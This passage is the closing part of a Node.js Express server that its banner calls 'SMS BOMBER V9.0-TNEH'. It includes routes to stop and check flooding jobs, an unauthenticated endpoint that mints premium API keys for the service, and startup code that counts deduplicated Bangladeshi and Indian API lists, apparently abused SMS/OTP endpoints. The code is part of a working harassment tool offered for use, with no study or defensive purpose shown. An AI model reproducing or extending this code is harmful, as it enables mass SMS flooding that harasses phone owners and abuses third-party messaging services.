  if (all === 'true') return res.json({ success: true, stopped_count: jobs.stopAll() });
  if (jobId) return res.json({ success: jobs.stop(jobId), jobId });
  res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM });
});

app.get('/api/status', (req, res) => {
  const { jobId } = req.query;
  if (jobId) {
    const j = jobs.view(jobId);
    if (!j) return res.status(404).json({ success: false, error: ERROR_MESSAGES.JOB_NOT_FOUND });
    return res.json({ success: true, job: j });
  }
  res.json({ success: true, stats: jobs.summary(), jobs: jobs.all() });
});

app.get('/api/expiredate=30&createkey', (req, res) => {
  const { plan = 'premium', days = 30 } = req.query;
  if (!PLAN_CONFIG[plan]) return res.status(400).json({ success: false, error: `Invalid plan` });
  const r = keys.mint(plan, parseInt(days) || 30);
  res.json({ success: true, api_key: r.apiKey, plan: r.plan, expiry: r.expiryDate.toISOString() });
});

app.get('/api/checkkey', (req, res) => {
  if (!req.query.key) return res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM });
  const info = keys.info(req.query.key);
  if (!info) return res.status(404).json({ success: false, error: 'Invalid key' });
  res.json({ success: true, ...info });
});

app.use((req, res) => res.status(404).json({ success: false, error: 'Endpoint not found', path: req.path }));

// ============================================================
// START
// ============================================================
const server = app.listen(CONFIG.server.port, CONFIG.server.host, () => {
  console.log(`\n🚀 SMS BOMBER V9.0-TNEH`);
  console.log(`📊 BD unique: ${BD_APIS_RAW.length} → with V1+V2: ${BD_DEDUP.length}`);
  console.log(`🇮🇳 IN: ${IN_DEDUP.length}`);
  console.log(`✅ ready on port ${CONFIG.server.port}\n`);
});
server.timeout = 180000;
server.keepAliveTimeout = 65000;

module.exports = { app, jobs, keys, BD_APIS_RAW, BD_DEDUP, IN_DEDUP };
